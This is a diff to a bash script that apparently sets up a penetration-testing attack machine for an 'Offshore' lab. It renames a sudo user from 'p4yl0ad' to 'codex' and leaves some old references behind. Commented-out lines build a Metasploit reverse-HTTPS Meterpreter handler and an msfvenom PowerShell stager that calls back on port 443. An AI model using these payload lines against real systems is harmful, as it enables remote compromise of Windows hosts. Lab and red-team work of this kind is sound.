@@ -112,12 +112,12 @@ ln -s /opt/openvpn-2.5.3/src/openvpn /usr/bin/openvpn
 
 echo "[+][+] user mgmt" >> /status.txt
 echo "[+] ssh user" >> /status.txt
-usertoadd="p4yl0ad"
+usertoadd="codex"
 
 sudouserpass=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
-echo $sudouserpass > /root/p4yl0ad_pass.txt
+echo $sudouserpass > /root/codex_pass.txt
 useradd $usertoadd --create-home --password "$(openssl passwd -1 $sudouserpass)" --shell /bin/bash -G sudo 2>/dev/null
-echo "p4yl0ad ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "codex ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 chown $usertoadd:$usertoadd /opt -R
 
 echo "[+] SSH Shit" >> /status.txt
@@ -128,11 +128,9 @@ systemctl restart ssh
 service sshd restart
 
 echo "[+] speed shit" >> /status.txt
-echo "alias cifg='curl ifconfig.so;echo'" >> /home/p4yl0ad/.bashrc
+echo "alias cifg='curl ifconfig.so;echo'" >> /home/codex/.bashrc
 echo "alias cifg='curl ifconfig.so;echo'" >> /root/.bashrc
-echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /home/p4yl0ad/.bashrc
-echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /root/.bashrc
-echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /home/p4yl0ad/.bashrc
+echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /home/codex/.bashrc
 echo "alias ch='sudo chown p4yl0ad /opt -R'" >> /root/.bashrc
 
 # GRC command colouring
@@ -148,9 +146,9 @@ echo -n $commandtoadd | base64 -d >> ~/.bashrc
 echo "" >> ~/.bashrc
 
 echo "[+] msf openssl cert " >> /status.txt
-mkdir /home/p4yl0ad/Offshore ;\
+mkdir /home/codex/Offshore ;\
 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -keyout /tmp/rsaprivate.key -out /tmp/servercertificate.crt -subj '/CN=localhost'
-cat /tmp/rsaprivate.key /tmp/servercertificate.crt > /home/p4yl0ad/Offshore/msf.pem
+cat /tmp/rsaprivate.key /tmp/servercertificate.crt > /home/codex/Offshore/msf.pem
 rm -rf /tmp/rsaprivate.key /tmp/servercertificate.crt
 
 #### psh-net loader ####
@@ -159,14 +157,14 @@ rm -rf /tmp/rsaprivate.key /tmp/servercertificate.crt
 
 #sudo msfdb init
 
-#cat << EOF >> /home/p4yl0ad/Offshore/tun.rc
+#cat << EOF >> /home/codex/Offshore/tun.rc
 #spool msf.log
 #set Prompt AyyLmao
 #set PromptChar >
 #
 #use exploit/multi/handler
 #set payload windows/x64/meterpreter/reverse_winhttps
-#set HandlerSSLCert /home/p4yl0ad/Offshore/msf.pem
+#set HandlerSSLCert /home/codex/Offshore/msf.pem
 #set SessionCommunicationTimeout 600
 #set LHOST tun0
 #set LPORT 443
@@ -195,13 +193,13 @@ rm -rf /tmp/rsaprivate.key /tmp/servercertificate.crt
 #exploit -j
 #EOF
 
-#msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/home/p4yl0ad/Offshore/msf.pem StagerVerifySSLCert=true -f psh-net -o /home/p4yl0ad/Offshore/reverse_winhttps_443.ps1
+#msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/home/codex/Offshore/msf.pem StagerVerifySSLCert=true -f psh-net -o /home/codex/Offshore/reverse_winhttps_443.ps1
 
 sudo chown p4yl0ad /opt/ -R
 su p4yl0ad
-echo 'PS1="[\[\033[32m\]\w]\[\033[0m\]\n\[\033[1;31m\]\u\[\033[1;33m\]-> \[\033[0m\]"' >> /home/p4yl0ad/.bashrc && source /home/p4yl0ad/.bashrc
+echo 'PS1="[\[\033[32m\]\w]\[\033[0m\]\n\[\033[1;31m\]\u\[\033[1;33m\]-> \[\033[0m\]"' >> /home/codex/.bashrc && source /home/codex/.bashrc
 cd ~
 
-for i in range {0..69}; do echo sudo cat /root/p4yl0ad_pass.txt; done
+for i in range {0..69}; do echo sudo cat /root/codex_pass.txt; done
 # fucking kek
 sudo echo "[!] Dunning kreuger [!]" >> /status.txt
